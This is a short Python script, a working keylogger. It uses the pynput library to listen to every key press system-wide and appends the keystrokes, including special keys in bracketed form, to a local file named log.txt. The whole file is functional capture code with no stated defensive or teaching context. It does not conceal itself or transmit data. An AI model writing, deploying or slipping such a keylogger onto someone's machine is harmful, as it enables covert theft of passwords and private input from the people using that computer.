from pynput.keyboard import Listener


with open("log.txt", "w") as file:
    file.write("") 

def write_to_file(key):
    key = str(key).replace("'", "")
    
    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key.startswith("Key."):
        key = f'[{key}]'

    with open("log.txt", "a") as file:
        file.write(key)

with Listener(on_press=write_to_file) as listener:
    listener.join()

